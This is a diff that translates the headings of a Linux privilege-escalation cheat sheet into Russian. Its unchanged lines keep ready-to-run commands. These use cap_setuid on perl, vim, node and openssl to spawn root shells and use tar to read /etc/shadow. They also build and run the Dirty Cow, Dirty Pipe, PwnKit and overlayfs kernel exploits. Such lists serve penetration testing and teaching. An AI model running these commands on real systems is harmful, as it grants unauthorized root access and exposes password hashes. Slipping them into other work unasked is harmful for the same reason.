@@ -415,34 +415,34 @@ perl с `cap_setuid` — повышение привилегий до root.
 perl -e 'use POSIX (setuid); POSIX::setuid(0); exec "/bin/bash";'
 ```
 
-vim cap_setuid — use Python to setuid and spawn shell
+vim с `cap_setuid` — вызов Python для установки UID и запуска оболочки.
 
 ```
 # vim with cap_setuid+ep:
 vim -c ":py3 import os; os.setuid(0); os.execl('/bin/bash', 'bash', '-p')"
 ```
 
-node cap_setuid — set UID to 0 and spawn shell
+node с `cap_setuid` — установка UID в 0 и запуск оболочки.
 
 ```
 # node with cap_setuid+ep:
 node -e "process.setuid(0); require('child_process').spawn('/bin/bash', {stdio: [0,1,2]})"
 ```
 
-tar cap_dac_read_search — read /etc/shadow
+tar с `cap_dac_read_search` — чтение `/etc/shadow`.
 
 ```
 # tar with cap_dac_read_search — read any file:
 tar xf /etc/shadow -I cat
 ```
 
-openssl cap_setuid — load malicious engine to escalate
+`openssl` с `cap_setuid` — загрузка вредоносного движка (engine) для повышения привилегий.
 ```
 # openssl with cap_setuid:
 openssl req -engine /tmp/evil.so
 ```
 
-Dirty Cow CVE-2016-5195 — overwrite /etc/passwd via PTRACE_POKETEXT
+Dirty Cow (CVE-2016-5195) — перезапись `/etc/passwd` через `PTRACE_POKETEXT`.
 
 ```
 # Dirty Cow (CVE-2016-5195) — kernel < 4.8.3
@@ -453,7 +453,7 @@ gcc -pthread dirty.c -o dirty -lcrypt
 # Creates /etc/passwd entry for firefart:password with root UID
 ```
 
-Dirty Pipe CVE-2022-0847 — overwrite SUID binaries to add shell backdoor
+Dirty Pipe (CVE-2022-0847) — перезапись SUID-бинарников для внедрения бэкдора с оболочкой.
 
 ```
 # Dirty Pipe (CVE-2022-0847) — kernel 5.8 to 5.16.11
@@ -462,7 +462,7 @@ Dirty Pipe CVE-2022-0847 — overwrite SUID binaries to add shell backdoor
 ./exploit /usr/bin/sudo
 ```
 
-PwnKit CVE-2021-4034 — pkexec out-of-bounds write → root
+PwnKit (CVE-2021-4034) — запись за границу буфера в pkexec → root.
 
 ```
 # PwnKit (CVE-2021-4034) — pkexec privilege escalation
@@ -471,7 +471,7 @@ PwnKit CVE-2021-4034 — pkexec out-of-bounds write → root
 ./PwnKit  # spawns root shell
 ```
 
-overlayfs CVE-2023-0386 — FUSE + overlayfs SUID file bypass
+overlayfs (CVE-2023-0386) — обход прав SUID через FUSE + overlayfs.
 
 ```
 # overlayfs (CVE-2023-0386) — kernel < 6.2
@@ -480,7 +480,9 @@ overlayfs CVE-2023-0386 — FUSE + overlayfs SUID file bypass
 ./poc
 ```
 
-linux-exploit-suggester.sh — match kernel version to known exploits
+**linux-exploit-suggester.sh — сопоставление версии ядра с известными эксплойтами.**
+
+(Обычно пишут просто «exploit suggester» — подбор подходящих эксплойтов по версии ядра.)
 
 ```
 # Automated kernel exploit suggester:
